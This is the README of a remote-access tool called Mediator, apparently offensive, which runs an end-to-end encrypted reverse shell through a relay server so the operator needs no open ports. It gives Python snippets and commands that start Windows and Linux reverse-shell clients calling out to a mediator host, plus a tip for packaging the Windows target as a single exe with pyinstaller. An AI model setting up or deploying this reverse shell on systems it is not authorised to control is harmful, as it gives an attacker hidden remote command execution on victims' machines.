# Mediator

Mediator is an end-to-end encrypted reverse shell that doesn't require port forwarding for the handler.

## Architecture:

Inspired by end-to-end encrypted chat applications, this reverse shell takes a unique approach to the client/server model of a reverse shell. This reverse shell uses:

1. A client reverse shell
2. A client handler/operator
3. A server that bridges the two connections

Reverse shells and handlers connect to the mediator server with a connection key. The server queues clients according to their respective type and connection key. When both a reverse shell and an operator connect to the server with the same key, the server will bridge the two connections. From there, a key exchange is done between the two clients, and all communication between the reverse shell and operator is encrypted end-to-end. This ensures the server cannot snoop on the streams it is piping.

## Instructions:

### Server

The client scripts can be run on Windows or Linux, but you'll need to stand up the server ([mediator.py](mediator.py)) on a Linux host. You can either run the server script with

```bash
$ python3 mediator.py
```

or you can build a Docker image with the provided [Dockerfile](Dockerfile) and run it in a container (make sure to publish ports 20000 and 20001).

### Clients

Both clients accept arguments for the server address and connection key.

**Mediator server address**

For *python script* usage, the address of the mediator host is required upon instantiation:

*Handler class*
```python
from handler import Handler

operator = Handler(mediatorHost="example.com")
operator.run()
```

*WindowsRShell class*
```python
from windowsTarget import WindowsRShell

shell = WindowsRShell(mediatorHost="example.com")
shell.run()
```

If executing a client *directly from a shell*, you can either hard code the address at the bottom of the script, or the server address can be specified as an argument with a `-s` or `--server` flag:

*handler.py*
```bash
$ python3 handler.py -s example.com
```

*windowsTarget.py*
```powershell
> python windowsTarget.py -s example.com
```

**Connection key**

When two handlers or two reverse shells connect to the mediator server with the same connection key, only the first connection is queued awaiting its match. Until the queued connection either times out (15 seconds) or matches with a counterpart connection, all other clients of the same type trying to connect with the same connection key will be dropped.

It is important to make sure each handler is using a unique connection key to avoid a race condition resulting in the wrong operator being given a shell. The default connection key is "CHANGE ME!!!".

To change the connection key for *python script* usage, the connection key can optionally be supplied upon instantiation:

*Handler class*
```python
from handler import Handler

operator = Handler(mediatorHost="example.com", connectionKey="This is my secret key!")
operator.run()
```

*LinuxRShell class*
```python
from linuxTarget import LinuxRShell

shell = LinuxRShell(mediatorHost="example.com", connectionKey="This is my secret key!")
shell.run()
```

REMINDER: handlers and reverse shells will not be bridged together unless they connect to the mediator server using the same connection key within 15 seconds of each other.

## Extra Info:

- You can easily create an exe for windowsTarget.py with pyinstaller using the `--onefile` flag

